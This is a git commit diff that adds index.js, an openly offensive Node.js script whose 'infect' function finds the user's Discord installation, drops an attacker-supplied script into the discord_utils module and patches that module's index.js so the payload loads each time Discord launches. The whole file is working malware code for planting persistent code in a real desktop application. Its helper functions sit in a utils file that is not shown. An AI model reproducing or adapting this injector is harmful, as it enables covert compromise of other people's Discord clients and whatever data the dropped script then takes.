ab7d0b085472fbe1b7af5680fcc476de66e9be54
7urb01 <7urb01@protonmail.com>
2020-03-25 17:51:28 -0400

    Commit all files.

---
+++ index.js
@@ -0,0 +1,24 @@
+const fs = require('fs');
+const utils = require('./utils');
+const discordPath = process.env.AppData + '/Discord';
+const victimModule = 'discord_utils';
+const scriptName = 'update.js';
+
+
+
+const infect = async ()=>{
+	if(!utils.assertArguments(3)) return false;
+	if(!utils.assertPath(discordPath)) return false;
+	const version = utils.findVersion(discordPath,'modules');
+	if(!version) return false;
+	const victimPath = `${discordPath}/${version}/modules/${victimModule}`;
+	if(!(await utils.dropScript(victimPath + `/${scriptName}`,victimPath + '/cache.js',process.argv[2]))) return false;
+	if(!utils.patchScript(victimPath + '/index.js',scriptName)) return false;
+	console.log('Sucessfully patched Discord to load script on launch.');
+}
+
+
+module.exports = {
+	infect
+}
+infect();
